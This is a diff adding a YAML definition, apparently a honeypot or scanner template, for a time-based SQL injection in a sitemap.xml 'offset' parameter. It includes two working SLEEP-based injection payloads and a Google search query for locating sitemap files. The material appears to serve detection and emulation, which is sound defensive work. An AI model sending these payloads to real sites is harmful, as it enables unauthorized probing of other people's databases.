@@ -1,0 +1,30 @@
+id: sitemap-sql-injection
+info:
+  name: Sitemap - SQL Injection
+  author: Aravind,j4vaovo
+  description: Sitemap is vulnerable to SQL Injection.
+  severity: high
+  reference: https://twitter.com/GodfatherOrwa/status/1647406811216072705?t=fbn0Eu34euKdrn4fL8UqfQ&s=19
+  metadata:
+    max-request: 2
+    google-query: intext:"sitemap" filetype:txt, filetype:xml inurl:sitemap
+  tags: misconfig,sitemap,sqli
+traps:
+- request:
+    method: POST
+    path: /sitemap.xml?offset=1;SELECT%20IF((SLEEP(6)),1,2356)#
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: sitemap>
+- request:
+    method: POST
+    path: /sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)#
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: sitemap>
